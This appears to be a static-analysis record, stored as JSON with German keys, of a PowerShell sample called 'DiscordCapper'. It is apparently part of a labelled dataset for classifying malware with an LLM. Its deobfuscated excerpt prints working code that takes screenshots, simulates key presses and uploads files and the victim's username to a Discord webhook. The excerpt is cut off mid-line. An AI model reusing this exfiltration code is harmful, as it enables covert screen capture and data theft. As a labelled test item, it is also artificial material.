@@ -1,0 +1,143 @@
+{
+  "meta": {
+    "quelldatei": "tech_020_DiscordCapper.ps1",
+    "sha256": "7b70da8310eaaa73aeb3dcfda1289de4b90c9f20651b1f8b0c2a5fdba4d06025",
+    "groesse_bytes": 4426,
+    "zeilen": 133,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "Application/Json",
+      "username",
+      "content",
+      "\r\nusing System;\r\nusing System.Runtime.InteropServices;\r\n\r\npublic class Keyboard {\r\n    [DllImport(",
+      ")]\r\n    public static extern void keybd_event(byte virtualKey, byte scanCode, uint flags, IntPtr extraInfo);\r\n}\r\n",
+      "$env:LOCALAPPDATA\\Discord\\Update.exe",
+      "$env:ProgramFiles\\Discord\\Discord.exe",
+      "$env:ProgramFiles(x86)\\Discord\\Discord.exe",
+      "--processStart Discord.exe",
+      "$env:TEMP\\screenshot1.png",
+      "$env:TEMP\\screenshot2.png",
+      "$env:TEMP\\screenshot3.png",
+      "$env:TEMP\\screenshot4.png",
+      "Discord is not installed on this machine.",
+      "YOUR DISCORD WEBHOOK"
+    ],
+    "string_anzahl_gesamt": 15,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "Application/Json",
+      "username",
+      "content",
+      "\r\nusing System;\r\nusing System.Runtime.InteropServices;\r\n\r\npublic class Keyboard {\r\n    [DllImport(",
+      ")]\r\n    public static extern void keybd_event(byte virtualKey, byte scanCode, uint flags, IntPtr extraInfo);\r\n}\r\n",
+      "$env:LOCALAPPDATA\\Discord\\Update.exe",
+      "$env:ProgramFiles\\Discord\\Discord.exe",
+      "$env:ProgramFiles(x86)\\Discord\\Discord.exe",
+      "--processStart Discord.exe",
+      "$env:TEMP\\screenshot1.png",
+      "$env:TEMP\\screenshot2.png",
+      "$env:TEMP\\screenshot3.png",
+      "$env:TEMP\\screenshot4.png",
+      "Discord is not installed on this machine.",
+      "YOUR DISCORD WEBHOOK"
+    ],
+    "string_anzahl_gesamt": 15,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Add-Type",
+      "Get-Discord",
+      "Invoke-RestMethod",
+      "New-Object",
+      "Start-Process",
+      "Start-Sleep",
+      "Test-Path",
+      "Upload-Discord",
+      "Write-Output"
+    ],
+    "auffaellige_tokens": {
+      "webclient": 1,
+      "start_process": 1,
+      "add_type": 2
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "$env:LOCALAPPDATA\\Discord\\Update.exe",
+        "$env:ProgramFiles",
+        "$env:ProgramFiles\\Discord\\Discord.exe",
+        "$env:TEMP\\screenshot1.png",
+        "$env:TEMP\\screenshot2.png",
+        "$env:TEMP\\screenshot3.png",
+        "$env:TEMP\\screenshot4.png",
+        "$env:username"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "Application/Json",
+      "username",
+      "content",
+      "\r\nusing System;\r\nusing System.Runtime.InteropServices;\r\n\r\npublic class Keyboard {\r\n    [DllImport(",
+      ")]\r\n    public static extern void keybd_event(byte virtualKey, byte scanCode, uint flags, IntPtr extraInfo);\r\n}\r\n",
+      "$env:LOCALAPPDATA\\Discord\\Update.exe",
+      "$env:ProgramFiles\\Discord\\Discord.exe",
+      "$env:ProgramFiles(x86)\\Discord\\Discord.exe",
+      "--processStart Discord.exe",
+      "$env:TEMP\\screenshot1.png",
+      "$env:TEMP\\screenshot2.png",
+      "$env:TEMP\\screenshot3.png",
+      "$env:TEMP\\screenshot4.png",
+      "Discord is not installed on this machine.",
+      "YOUR DISCORD WEBHOOK"
+    ],
+    "string_anzahl_gesamt": 15,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Add-Type",
+      "Get-Discord",
+      "Invoke-RestMethod",
+      "New-Object",
+      "Start-Process",
+      "Start-Sleep",
+      "Test-Path",
+      "Upload-Discord",
+      "Write-Output"
+    ],
+    "auffaellige_tokens": {
+      "webclient": 1,
+      "start_process": 1,
+      "add_type": 2
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "$env:LOCALAPPDATA\\Discord\\Update.exe",
+        "$env:ProgramFiles",
+        "$env:ProgramFiles\\Discord\\Discord.exe",
+        "$env:TEMP\\screenshot1.png",
+        "$env:TEMP\\screenshot2.png",
+        "$env:TEMP\\screenshot3.png",
+        "$env:TEMP\\screenshot4.png",
+        "$env:username"
+      ]
+    },
+    "deobfuskiert_auszug": "function Upload-Discord {\r\n    param (\r\n        [string]$file,\r\n        [string]$text,\r\n        [string]$webhookUrl\r\n    )\r\n\r\n    if ($text) {\r\n        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body @{ 'username' = $env:username; 'content' = $text }\r\n    }\r\n    elseif ($file) {\r\n        (New-Object Net.WebClient).UploadFile($webhookUrl, $file)\r\n    }\r\n}\r\n\r\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\r\n    $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height\r\n    $graphics = [Drawing.Graphics]::FromImage($bmp)\r\n    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)\r\n    $bmp.Save($path)\r\n    $graphics.Dispose()\r\n    $bmp.Dispose()\r\n}\r\n\r\nAdd-Type -AssemblyName System.Windows.Forms\r\nAdd-Type -TypeDefinition @\"\r\nusing System;\r\nusing System.Runtime.InteropServices;\r\n\r\npublic class Keyboard {\r\n    [DllImport(\"user32.dll\")]\r\n    public static extern void keybd_event(byte virtualKey, byte scanCode, uint flags, IntPtr extraInfo);\r\n}\r\n\"@\r\n\r\nfunction PressKeys {\r\n    $ctrlKey = 0x11\r\n    $altKey = 0x12\r\n    $rightArrowKey = 0x27\r\n\r\n    [Keyboard]::keybd_event($ctrlKey, 0, 0, [IntPtr]::Zero)\r\n    [Keyboard]::keybd_event($altKey, 0, 0, [IntPtr]::Zero)\r\n    [Keyboard]::keybd_event($rightArrowKey, 0, 0, [IntPtr]::Zero)\r\n    [Keyboard]::keybd_event($rightArrowKey, 0, 2, [IntPtr]::Zero)\r\n    [Keyboard]::keybd_event($ctrlKey, 0, 2, [IntPtr]::Zero)\r\n    [Keyboard]::keybd_event($altKey, 0, 2, [IntPtr]::Zero)\r\n}\r\n\r\nfunction PressKeys2 {\r\n    $altKey = 0x12\r\n    $downArrowKey = 0x28\r\n\r\n    [Keyboard]::keybd_event($altKey, 0, 0, [IntPtr]::Zero)\r\n    [Keyboard]::keybd_event($downArrowKey, 0, 0, [IntPtr]::Zero)\r\n    [Keyboard]::keybd_event($downArrowKey, 0, 2, [IntPtr]::Zero)\r\n    [Keyboard]::keybd_event($altKey, 0, 2, [IntPtr]::Zero)\r\n}\r\n\r\nfunction PressKeys3 {\r\n    $altKey = 0x12\r\n    $spaceKey = 0x20\r\n    $upArrowKey = 0x26\r\n    $enterKey = 0x0D\r\n\r\n    [Keyboard]::keybd_event($altKey, 0, 0, [IntPtr",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "WebClient erstellen",
+      "Prozess starten"
+    ]
+  }
+}
